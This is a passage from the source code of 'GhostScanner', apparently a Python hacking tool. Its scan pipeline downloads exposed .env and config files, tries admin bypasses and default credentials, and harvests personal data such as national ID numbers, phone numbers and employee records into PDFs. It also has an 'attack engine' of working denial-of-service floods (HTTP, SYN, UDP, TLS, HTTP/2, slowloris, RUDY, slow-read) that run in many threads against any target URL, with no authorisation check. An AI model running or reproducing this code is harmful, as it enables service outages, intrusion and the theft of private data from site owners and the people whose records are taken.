                        for host in root.findall('host'):
                            for port in host.findall('.//port'):
                                pid = port.get('portid')
                                st = port.find('state')
                                svc = port.find('service')
                                if st is not None and st.get('state') == 'open':
                                    svc_name = svc.get('name','unknown') if svc is not None else 'unknown'
                                    findings.append({
                                        "type": f"Nmap: Open Port {pid}",
                                        "param": "N/A", "payload": str(pid),
                                        "evidence": f"Service: {svc_name}",
                                        "risk": "MEDIUM" if pid in
                                                ['22','3306','5432','6379','27017'] else "INFO",
                                        "confidence": 95,
                                        "poc": {"url": f"{domain}:{pid}",
                                                 "curl": f"nmap -sV -p {pid} {domain}",
                                                 "response": svc_name,
                                                 "statusCode": 200,
                                                 "timeDiff": "N/A",
                                                 "verified": True}
                                    })
                    except: pass
        except: pass
        return findings

    # ============================================================
    # DISPLAY
    # ============================================================
    def _display(self, findings):
        c = Console()
        s = self.results_scan["summary"]
        region = self.results_scan.get("region", {})
        c.print(Panel(
            f"[bold]Category:[/bold] {self.results_scan['domain_category']} / {self.results_scan['domain_subcategory']}\n"
            f"[bold]Region:[/bold] {region.get('country','Unknown')} ({region.get('country_code','XX')}) "
            f"| City: {region.get('city','')} | ISP: {region.get('isp','')}\n"
            f"[bold]Server IP:[/bold] {self.results_scan.get('server_ip','N/A')}\n"
            f"[bold]Total:[/bold] {s['total']} | "
            f"[red]Critical:[/red] {s['critical']} | "
            f"[yellow]High:[/yellow] {s['high']} | "
            f"[cyan]Medium:[/cyan] {s['medium']} | "
            f"[green]Low:[/green] {s['low']}",
            title=f"[bold white]SUMMARY v{TOOLS_VERSION}[/bold white]",
            border_style="red"))

        if self.results_scan.get("env_files_found"):
            et = Table(title="🚨 ENV Files Exposed", box=box.ROUNDED)
            et.add_column("URL"); et.add_column("Size"); et.add_column("Keys")
            for e in self.results_scan["env_files_found"][:20]:
                et.add_row(e["url"][:60], f"{e['content_size']}b", str(e.get('total_keys',0)))
            c.print(et)

        if self.results_scan.get("config_files_found"):
            ct = Table(title="🔓 Config Files Exposed", box=box.ROUNDED)
            ct.add_column("URL"); ct.add_column("Size")
            for c_ in self.results_scan["config_files_found"][:20]:
                ct.add_row(c_["url"][:60], f"{c_['content_size']}b")
            c.print(ct)

        if self.results_scan.get("ports_real"):
            pt = Table(title="Open Ports (real)", box=box.ROUNDED)
            pt.add_column("Host"); pt.add_column("Port"); pt.add_column("Service")
            pt.add_column("Risk"); pt.add_column("HTTP")
            for p in self.results_scan["ports_real"][:40]:
                pt.add_row(p["host"], str(p["port"]), p.get("service","?"),
                           p.get("risk","INFO"), str(p.get("http_status","-")))
            c.print(pt)

        if self.results_scan["vulnerabilities"].get("admin_access"):
            c.print("[bold green]✓ ADMIN ACCESS PoC:[/bold green]")
            for a in self.results_scan["vulnerabilities"]["admin_access"]:
                if "admin_panel" in a:
                    c.print(f"   → {a['admin_panel']} [{a['status']}]")
                else:
                    c.print(f"   → {a['url']} user={a['credentials']['user']!r} "
                            f"pass={a['credentials']['pass']!r} [{a['status']}]")

        if self.results_scan["vulnerabilities"].get("bot_protection"):
            c.print("[bold yellow]🤖 BOT PROTECTION:[/bold yellow]")
            for b in self.results_scan["vulnerabilities"]["bot_protection"]:
                c.print(f"   → WAF: {', '.join(b.get('waf',[])) or 'None'} | CAPTCHA: {', '.join(b.get('captcha',[])) or 'None'}")

        if self.results_scan["vulnerabilities"].get("admin_bypass"):
            c.print("[bold green]✓ ADMIN BYPASS:[/bold green]")
            for ab in self.results_scan["vulnerabilities"]["admin_bypass"][:10]:
                c.print(f"   → {ab['type']}: {ab['param']}")

        sd = self.results_scan["sensitive_data"]
        live = {k: v for k, v in sd.items() if v}
        if live:
            st = Table(title="Sensitive Data Harvested", box=box.ROUNDED)
            st.add_column("Type"); st.add_column("Count"); st.add_column("Sample")
            for k, v in list(live.items())[:30]:
                st.add_row(k, str(len(v)), ", ".join(str(x)[:40] for x in v[:3]))
            c.print(st)

        if not findings:
            c.print("[green]No vulnerabilities found.[/green]"); return
        t = Table(title="Findings", box=box.ROUNDED)
        for col in ["Type","Param","Risk","Verified"]:
            t.add_column(col)
        for f in findings[:60]:
            v = "OK" if f.get("poc", {}).get("verified") else "?"
            t.add_row(f.get("type","?")[:45], str(f.get("param","N/A"))[:20],
                      f.get("risk","INFO"), v)
        c.print(t)

    # ============================================================
    # MAIN SCAN
    # ============================================================
    def run_scan(self, target):
        self.results_scan["target"] = target
        self.results_scan["domain"] = urlparse(target).netloc
        cat, sub = classify_domain_full(self.results_scan["domain"])
        self.results_scan["domain_category"] = cat
        self.results_scan["domain_subcategory"] = sub
        self.results_scan["timestamp"] = datetime.now().isoformat()
        start = time.time()
        console = Console()
        console.print(f"[bold red]🚀 {TOOLS_NAME} v{TOOLS_VERSION} on {target}[/bold red]")
        console.print(f"[bold cyan]Category: {cat} / {sub}[/bold cyan]")

        server_ip = self._get_server_ip(self.results_scan["domain"])
        self.results_scan["server_ip"] = server_ip
        ip_info = self._get_ip_info(server_ip) if server_ip else None
        console.print(f"[bold cyan]Server IP: {server_ip}[/bold cyan]")

        resp = self._smart_request(target, timeout=20)
        if not resp:
            console.print("[red]Target unreachable![/red]")
            return self.results_scan
        html = resp.text or ""

        region = RegionDetector.detect(self.results_scan["domain"], html, ip_info)
        self.results_scan["region"] = region
        console.print(f"[bold cyan]Region: {region['country']} | {region['city']} | {region['isp']}[/bold cyan]")

        # 1. Internal checks
        console.print("[bold cyan]═══ INTERNAL CHECKS ═══[/bold cyan]")
        self.results_scan["vulnerabilities"]["robots"] = self._check_robots(target)
        self.results_scan["vulnerabilities"]["sitemap"] = self._check_sitemap(target)
        self.results_scan["vulnerabilities"]["dir_enum"] = self._check_dir_enum(target)
        self.results_scan["vulnerabilities"]["security_headers"] = self._check_security_headers(target)
        self.results_scan["vulnerabilities"]["waf_detection"] = self._check_waf(target)
        self.results_scan["vulnerabilities"]["cors"] = self._check_cors(target)
        self.results_scan["vulnerabilities"]["open_redirect_sneijder"] = self._check_open_redirect(target)
        self.results_scan["vulnerabilities"]["ssl_info"] = self._check_ssl_info(target)
        self.results_scan["vulnerabilities"]["cookie_flags"] = self._check_cookie_flags(target)
        self.results_scan["vulnerabilities"]["rate_limit_sneijder"] = self._check_rate_limit(target)
        self.results_scan["vulnerabilities"]["wp_activity_log_rce"] = self._check_wp_activity_log(target)
        self.results_scan["vulnerabilities"]["deface"] = self._check_deface_advanced(target)
        self.results_scan["vulnerabilities"]["jwt_attack"] = self._check_jwt_attack(target)
        self.results_scan["vulnerabilities"]["http_smuggling"] = self._check_http_smuggling(target)
        self.results_scan["vulnerabilities"]["graphql_introspection"] = self._check_graphql(target)
        self.results_scan["vulnerabilities"]["oauth_bypass"] = self._check_oauth_bypass(target)

        forms = self._extract_forms(html, target)
        self.results_scan["vulnerabilities"]["csrf_sneijder"] = self._check_csrf(target, forms)

        # 2. NEW: BOT CHECKER
        console.print("[bold magenta]═══ BOT CHECKER ═══[/bold magenta]")
        self.results_scan["vulnerabilities"]["bot_protection"] = self._check_bot_protection(target)

        # 3. NEW: ADMIN BYPASS
        console.print("[bold magenta]═══ ADMIN BYPASS ═══[/bold magenta]")
        self.results_scan["vulnerabilities"]["admin_bypass"] = self._admin_bypass(target)

        # 4. ENV + CONFIG files
        console.print("[bold magenta]═══ ENV + CONFIG DOWNLOAD ═══[/bold magenta]")
        self._scan_env_and_config_files(target)

        # 5. Deep harvest
        console.print("[bold magenta]═══ DEEP HARVEST ═══[/bold magenta]")
        deep = self._harvest_all_sensitive(target, html)
        for k, v in deep.items():
            self.results_scan["sensitive_data"].setdefault(k, [])
            self.results_scan["sensitive_data"][k] = list(dict.fromkeys(
                self.results_scan["sensitive_data"][k] + v))[:500]
        self._save_sensitive_data([deep])

        # 6. NEW: HARVEST ALL (Deep Crawl)
        console.print("[bold magenta]═══ HARVEST ALL (Deep Crawl) ═══[/bold magenta]")
        harvest_all = self._harvest_all(target)
        if harvest_all:
            self.results_scan["vulnerabilities"]["harvest_all"] = [{
                "type": "Deep Harvest", "param": "N/A", "payload": "N/A",
                "evidence": f"Harvested {len(harvest_all)} pages", "risk": "INFO",
                "confidence": 100,
                "poc": {"url": target, "curl": f'curl -k "{target}"',
                         "response": f"{len(harvest_all)} pages", "statusCode": 200,
                         "timeDiff": "N/A", "verified": True}
            }]

        # 7. Document harvest
        console.print("[bold magenta]═══ DOCUMENT HARVEST ═══[/bold magenta]")
        docs = self._harvest_documents(target)
        for doc in docs:
            for k, v in doc.get("pii", {}).items():
                self.results_scan["sensitive_data"].setdefault(k, [])
                self.results_scan["sensitive_data"][k] = list(dict.fromkeys(
                    self.results_scan["sensitive_data"][k] + v))[:500]

        # 8. NIK regions + employee
        self.results_scan["nik_regions"] = self._nik_region_breakdown(
            self.results_scan["sensitive_data"].get("nik", []))
        employees = self._build_employee_records(self.results_scan["sensitive_data"], docs)
        self.results_scan["employee_data"] = employees
        if employees:
            self._generate_employee_pdf(employees, target)

        # 9. Update region
        phones = self.results_scan["sensitive_data"].get("no_hp", []) + \
                 self.results_scan["sensitive_data"].get("phone_intl", [])
        region = RegionDetector.detect(self.results_scan["domain"], html, ip_info,
                                        self.results_scan["sensitive_data"], phones)
        self.results_scan["region"] = region

        # 10. Admin PoC
        console.print("[bold magenta]═══ ADMIN PoC ═══[/bold magenta]")
        if self.force_admin or self.scan:
            self._admin_poc(target, forms)
            endpoints = self._detect_spa_login(html, target)
            api_pocs = self._admin_poc_api(target, endpoints)
            if api_pocs:
                self.results_scan["vulnerabilities"]["admin_access_api"] = api_pocs

        # 11. Port probe
        console.print("[bold magenta]═══ PORT PROBE ═══[/bold magenta]")
        self._probe_ports_real(self.results_scan["domain"])

        # 12. DoS confirm
        console.print("[bold magenta]═══ DoS CONFIRM ═══[/bold magenta]")
        self.results_scan["vulnerabilities"]["ddos_vulnerability"] = self._check_ddos_vulnerability(target)

        # 13. OSINT email
        emails = self.results_scan["sensitive_data"].get("email", [])
        for email in emails[:3]:
            osint = self._run_user_scanner(email)
            if osint:
                self.results_scan["vulnerabilities"]["user_scanner_osint"].extend(osint)

        # 14. Injection scans
        all_p = {}
        all_p.update(self._extract_params_from_url(target))
        for form in forms:
            if form["method"] == "GET":
                for i in form["inputs"]:
                    all_p[i["name"]] = "1"
        for c_ in self.common_params[:40]:
            all_p.setdefault(c_, "1")
        params = dict(list(all_p.items())[:60])

        console.print("[bold cyan]═══ INJECTION SCAN ═══[/bold cyan]")
        self.results_scan["vulnerabilities"]["xss_dom"] = self._check_dom_xss(html, target)
        self.results_scan["vulnerabilities"]["xss_context_aware"] = self._scan_xss(target, params)
        self.results_scan["vulnerabilities"]["sql_injection"] = self._scan_sql(target, params)

        # 15. External tools
        if self.use_tools:
            console.print("[bold magenta]═══ EXTERNAL TOOLS ═══[/bold magenta]")
            subs = self._run_subfinder(self.results_scan["domain"])
            self.results_scan["external"]["subdomains"] = subs
            katana_urls = self._run_katana(target)
            self.results_scan["external"]["katana_urls"] = katana_urls[:200]
            self.results_scan["vulnerabilities"]["nuclei"] = self._run_nuclei(target)
            self.results_scan["vulnerabilities"]["nmap"] = self._run_nmap(target)
            if subs:
                self.results_scan["vulnerabilities"]["subdomain_takeover"] = \
                    self._check_subdomain_takeover(subs)

        # 16. Summary
        all_f = []
        for cat_l, items in self.results_scan["vulnerabilities"].items():
            if isinstance(items, list):
                all_f.extend(items)
        self.results_scan["summary"] = {
            "total": len(all_f),
            "critical": len([f for f in all_f if f.get("risk") == "CRITICAL"]),
            "high": len([f for f in all_f if f.get("risk") == "HIGH"]),
            "medium": len([f for f in all_f if f.get("risk") == "MEDIUM"]),
            "low": len([f for f in all_f if f.get("risk") == "LOW"]),
            "info": len([f for f in all_f if f.get("risk") == "INFO"]),
        }
        self.results_scan["scan_duration"] = time.time() - start
        self.results_scan["validated"] = True

        # 17. AI
        if self.ai:
            ai_text, ai_model = self._ai_analysis(all_f, target,
                                                    self.results_scan.get("admin_data"))
            self.results_scan["ai_analysis"] = ai_text
            self.results_scan["ai_model_used"] = ai_model

        # 18. Outputs
        self._generate_all_sensitive_pdfs(self.results_scan["sensitive_data"], target)
        self._display(all_f)

        jf = os.path.join(self.result_folder, f"scan_v57_{int(time.time())}.json")
        try:
            with open(jf, "w", encoding="utf-8") as f:
                json.dump(self.results_scan, f, indent=2, ensure_ascii=False)
            console.print(f"[green]JSON: {os.path.abspath(jf)}[/green]")
        except Exception as e:
            console.print(f"[yellow]JSON save error: {e}[/yellow]")

        if self.pdf:
            self._generate_pdf(self.results_scan,
                                os.path.join(self.result_folder,
                                             f"report_v57_{int(time.time())}.pdf"))
        return self.results_scan

# ============================================================
# ATTACK ENGINE (v5.7 - NEW METHODS)
# ============================================================
def _attack_worker_pool(target, threads, method, stats, lock, running):
    domain = urlparse(target).netloc.split(":")[0]
    port = 443 if target.startswith("https") else 80

    def http_flood():
        session = requests.Session(); session.verify = False
        while running[0]:
            try:
                session.get(target, headers={"User-Agent": random.choice(USER_AGENTS),
                                              "Accept":"*/*","Connection":"keep-alive"},
                            timeout=3)
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(random.uniform(0.0005, 0.004))

    def syn_flood():
        while running[0]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
                s.connect((domain, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                s.close()
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(random.uniform(0.0005, 0.003))

    def slowloris():
        pool = []
        while running[0]:
            try:
                while len(pool) < 50:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
                    s.connect((domain, port))
                    s.send(b"GET /?" + os.urandom(4).hex().encode() + b" HTTP/1.1\r\n")
                    s.send(b"Host: " + domain.encode() + b"\r\n")
                    pool.append(s)
                    with lock: stats["success"] += 1
                for s in list(pool):
                    try: s.send(b"X-a: " + os.urandom(2).hex().encode() + b"\r\n")
                    except: pool.remove(s)
                time.sleep(5)
            except:
                with lock: stats["fail"] += 1

    def udp_flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(1400)
        while running[0]:
            try:
                for _ in range(20):
                    s.sendto(payload, (domain, random.choice([53,123,161,389,1900,5353])))
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(0.0005)

    def ssl_reneg():
        while running[0]:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
                s.connect((domain, port))
                ss = ctx.wrap_socket(s, server_hostname=domain)
                for _ in range(10): ss.send(b"R" * 16384)
                ss.close()
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(0.001)

    # NEW METHODS
    def tls_flood():
        while running[0]:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((domain, port))
                ss = ctx.wrap_socket(s, server_hostname=domain)
                ss.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                ss.close()
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(random.uniform(0.001, 0.005))

    def rudy():
        pool = []
        while running[0]:
            try:
                while len(pool) < 30:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((domain, port))
                    s.send(b"POST / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n")
                    s.send(b"Content-Length: 1000000\r\n\r\n")
                    pool.append(s)
                    with lock: stats["success"] += 1
                for s in list(pool):
                    try:
                        s.send(b"X" * random.randint(1, 10))
                    except:
                        pool.remove(s)
                time.sleep(8)
            except:
                with lock: stats["fail"] += 1

    def slow_read():
        while running[0]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((domain, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() +
                       b"\r\nConnection: keep-alive\r\n\r\n")
                time.sleep(random.uniform(0.5, 2))
                s.close()
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(random.uniform(0.01, 0.05))

    def h2_flood():
        while running[0]:
            try:
                import h2.connection
                import h2.config
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((domain, port))
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=domain)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                for _ in range(50):
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, [(":method", "GET"), (":path", "/")])
                    conn.send_data(stream_id, b"x" * 1024, end_stream=True)
                s.sendall(conn.data_to_send())
                s.close()
                with lock: stats["success"] += 1
            except:
                with lock: stats["fail"] += 1
            time.sleep(random.uniform(0.01, 0.05))

    workers = {
        "http": http_flood, "syn": syn_flood, "slow": slowloris,
        "udp": udp_flood, "ssl": ssl_reneg,
        "tls": tls_flood, "rudy": rudy, "slowread": slow_read,
        "h2": h2_flood,
    }
    fn = workers.get(method, http_flood)
    for _ in range(threads):
        threading.Thread(target=fn, daemon=True).start()


class AttackEngine:
    def __init__(self, target, threads=200, duration=30, method='http'):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.method = method

    def start(self):
        c = Console()
        c.print(f"[bold red]🔥 REAL ATTACK: {self.method.upper()}[/bold red]")
        c.print(f"[yellow]Target: {self.target}[/yellow]")
        c.print(f"[yellow]Threads: {self.threads} | Duration: {self.duration}s[/yellow]\n")
        running = [True]
        stats = {"success": 0, "fail": 0}
        lock = threading.Lock()
        methods = ["http","syn","slow","udp","ssl","tls","rudy","slowread","h2"] \
                  if self.method == "all" else [self.method]
        for m in methods:
            _attack_worker_pool(self.target, self.threads // len(methods), m, stats, lock, running)
        t0 = time.time()
        try:
            while time.time() - t0 < self.duration:
                time.sleep(2)
                with lock:
                    c.print(f"[cyan]⚡ OK: {stats['success']} | Fail: {stats['fail']} | "
                            f"{int(time.time()-t0)}s/{self.duration}s[/cyan]")
        except KeyboardInterrupt:
            c.print("[yellow]Stopped.[/yellow]")
        running[0] = False
        time.sleep(0.5)
        c.print(f"\n[bold green]✓ Attack done. OK={stats['success']} Fail={stats['fail']}[/bold green]")

# ============================================================
# UTILS
# ============================================================
def build_url(base, param, payload):
    return base + ('&' if '?' in base else '?') + param + '=' + quote(payload)

def is_tool_available(tool_name):
    return shutil.which(tool_name) is not None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    clear_screen(); show_banner()
    Console().print(Panel(f"""
[bold cyan]USAGE:[/bold cyan]
  python ghostscanner.py -u <URL> [OPTIONS]

[bold yellow]SCAN:[/bold yellow]
  --scan / --ai / --pdf / --quick / --force-admin / --tools
  --delay N / --no-proxy / --proxy-list FILE / --validate-proxy
  --threads N / --fast / --deep

[bold yellow]ATTACK (REAL):[/bold yellow]
  --dos / --ddos / --syn / --slow / --ssl-reneg / --udp
  --tls-flood / --rudy / --slow-read / --h2-flood
  --threads N --duration N

[bold green]NEW FEATURES:[/bold green]
  --bot-check        Detect bot protection (WAF, CAPTCHA)
  --admin-bypass     Test 403/401 bypass techniques
  --harvest-all      Deep crawl + download + extract all

[bold green]CONTOH:[/bold green]
  python ghostscanner.py -u https://target.com --scan --ai --pdf --tools --fast
  python ghostscanner.py -u https://target.com --tls-flood --threads 200 --duration 30
  python ghostscanner.py -u https://target.com --bot-check --admin-bypass --harvest-all
""", border_style="cyan", title=f"[bold white]{TOOLS_NAME} v{TOOLS_VERSION}[/bold white]"))
    sys.exit(0)

def show_banner():
    red = "\033[91m"; cyan = "\033[96m"; yellow = "\033[93m"
    white = "\033[97m"; green = "\033[92m"; magenta = "\033[95m"
    reset = "\033[0m"; bold = "\033[1m"
    skull = SKULL_ART.strip('\n').split('\n')
    side = [
        f"{cyan}{bold}GHOST SCANNER{reset}",
        f"{red}---------------------------------{reset}",
        f"{green}Nama Tools{reset}: {white}{TOOLS_NAME} v{TOOLS_VERSION}{reset}",
        f"{green}Mode      {reset}: {white}Main Menu{reset}",
        f"{green}Tools By  {reset}: {magenta}{TOOLS_BY}{reset}",
        f"{yellow}[{TOOLS_GITHUB}]{reset}",
        f"{red}---------------------------------{reset}",
        f"{cyan}{bold}KALI LINUX {reset}| {cyan}{bold}TERMUX {reset}| {cyan}{bold}HACKING{reset}",
        "",
        f"   {green}Fitur :{reset} {white}Full Scan + New Attacks + Bot Check + Admin Bypass{reset}",
        f"   {red}═══════════════════════════════════════════════════════════════{reset}",
    ]
    max_lines = max(len(skull), len(side))
    for i in range(max_lines):
        left_vis = skull[i] if i < len(skull) else ""
        left = red + left_vis + reset
        right = side[i] if i < len(side) else ""
        padding = " " * max(0, 40 - len(left_vis))
        print(f"{left}{padding}{right}")
    print()

# ============================================================
# MENU
# ============================================================
def show_menu():
    Console().print(Panel(f"""
[bold cyan]{TOOLS_NAME} v{TOOLS_VERSION} - MENU[/bold cyan]

[1] SCAN (Fast Unified)   - Full automated scan
[2] TOOLS (External)      - External tools
[3] ATTACK (Real)         - Real DDoS/DoS (9 methods)
[4] HELP                  - Show help
[0] EXIT
""", border_style="cyan"))
    return Console().input("[bold green]Pilih menu: [/bold green]").strip()

# ============================================================
# MAIN
# ============================================================
def main():
    if '-h' in sys.argv or '--help' in sys.argv: show_help()

    if len(sys.argv) == 1:
        while True:
            choice = show_menu()
            if choice in ("0", "exit"): sys.exit(0)
            elif choice == "1":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target: continue
                ai = Console().input("Enable AI? [y/N]: ").strip().lower() == 'y'
                pdf = Console().input("Generate PDF? [y/N]: ").strip().lower() == 'y'
                tools = Console().input("Run external tools? [y/N]: ").strip().lower() == 'y'
                force = Console().input("Force admin bypass? [y/N]: ").strip().lower() == 'y'
                fast = Console().input("Fast mode? [Y/n]: ").strip().lower() != 'n'
                scanner = GhostScanner(target=target, ai=ai, pdf=pdf, use_tools=tools,
                                        force_admin=force, scan=True, fast=fast)
                try: scanner.run_scan(target)
                except KeyboardInterrupt: Console().print("[red]Interrupted.[/red]")
                except Exception as e:
                    Console().print(f"[red]Error: {e}[/red]")
                    import traceback; traceback.print_exc()
                input("\n[Press Enter to continue]")
            elif choice == "2":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target: continue
                scanner = GhostScanner(target=target, use_tools=True)
                try: scanner.run_scan(target)
                except Exception as e: Console().print(f"[red]Error: {e}[/red]")
                input("\n[Press Enter to continue]")
            elif choice == "3":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target: continue
                method = Console().input("Method [dos/ddos/syn/slow/ssl-reneg/udp/tls-flood/rudy/slow-read/h2-flood]: ").strip().lower()
                threads = int(Console().input("Threads [200]: ").strip() or "200")
                duration = int(Console().input("Duration [30s]: ").strip() or "30")
                m = "http"
                if method == "ddos": m = "all"
                elif method == "syn": m = "syn"
                elif method in ("ssl-reneg","ssl"): m = "ssl"
                elif method == "udp": m = "udp"
                elif method == "slow": m = "slow"
                elif method == "tls-flood": m = "tls"
                elif method == "rudy": m = "rudy"
                elif method == "slow-read": m = "slowread"
                elif method == "h2-flood": m = "h2"
                AttackEngine(target, threads=threads, duration=duration, method=m).start()
                input("\n[Press Enter to continue]")
            elif choice == "4": show_help()
            else:
                Console().print("[red]Invalid choice![/red]"); time.sleep(1)
        return

    p = argparse.ArgumentParser(description=f"{TOOLS_NAME} v{TOOLS_VERSION}", add_help=False)
    p.add_argument("-u","--url")
    p.add_argument("-o","--output", default="results.json")
    p.add_argument("-v","--verbose", action="store_true")
    p.add_argument("--proxy-list")
    p.add_argument("--validate-proxy", action="store_true")
    p.add_argument("--no-proxy", action="store_true")
    p.add_argument("--quick", action="store_true")
    p.add_argument("--pdf", action="store_true")
    p.add_argument("--ai", action="store_true")
    p.add_argument("--delay", type=float, default=0.2)
    p.add_argument("--force-admin", action="store_true")
    p.add_argument("--tools", action="store_true")
    p.add_argument("--scan", action="store_true")
    p.add_argument("--fast", action="store_true")
    p.add_argument("--deep", action="store_true")
    # ATTACK
    p.add_argument("--dos", action="store_true")
    p.add_argument("--ddos", action="store_true")
    p.add_argument("--syn", action="store_true")
    p.add_argument("--slow", action="store_true")
    p.add_argument("--ssl-reneg", action="store_true")
    p.add_argument("--udp", action="store_true")
    p.add_argument("--tls-flood", action="store_true")
    p.add_argument("--rudy", action="store_true")
    p.add_argument("--slow-read", action="store_true")
    p.add_argument("--h2-flood", action="store_true")
    p.add_argument("--threads", type=int, default=50)
    p.add_argument("--duration", type=int, default=30)
    # NEW FEATURES
    p.add_argument("--bot-check", action="store_true")
    p.add_argument("--admin-bypass", action="store_true")
    p.add_argument("--harvest-all", action="store_true")
    args = p.parse_args()

    clear_screen(); show_banner()

    if not args.url:
        try:
            args.url = Console().input("[bold cyan]Enter target URL: [/bold cyan]").strip()
            if not args.url:
                Console().print("[red]No target. Exiting.[/red]"); sys.exit(1)
        except (KeyboardInterrupt, EOFError):
            Console().print("\n[yellow]Cancelled.[/yellow]"); sys.exit(0)

    attack = (args.dos or args.ddos or args.syn or args.ssl_reneg or args.udp
              or args.slow or args.tls_flood or args.rudy or args.slow_read or args.h2_flood)
    if attack:
        m = "http"
        if args.ddos: m = "all"
        elif args.syn: m = "syn"
        elif args.slow: m = "slow"
        elif args.ssl_reneg: m = "ssl"
        elif args.udp: m = "udp"
        elif args.tls_flood: m = "tls"
        elif args.rudy: m = "rudy"
        elif args.slow_read: m = "slowread"
        elif args.h2_flood: m = "h2"
        AttackEngine(args.url, threads=args.threads, duration=args.duration, method=m).start()
    else:
        scanner = GhostScanner(
            target=args.url, use_proxy=not args.no_proxy, proxy_file=args.proxy_list,
            validate_proxy=args.validate_proxy, quick=args.quick, pdf=args.pdf,
            ai=args.ai, delay=args.delay, force_admin=args.force_admin,
            use_tools=args.tools, scan=args.scan, threads=args.threads,
            fast=args.fast, deep=args.deep
        )
        # Bot check only
        if args.bot_check:
            scanner._check_bot_protection(args.url)
        # Admin bypass only
        if args.admin_bypass:
            scanner._admin_bypass(args.url)
        # Harvest all only
        if args.harvest_all:
            scanner._harvest_all(args.url)
        # Full scan if requested
        if args.scan:
            try: scanner.run_scan(args.url)
            except KeyboardInterrupt:
                Console().print("[red]Interrupted.[/red]")
            except Exception as e:
                Console().print(f"[red]Error: {e}[/red]")
                import traceback; traceback.print_exc()

if __name__ == "__main__":
    main()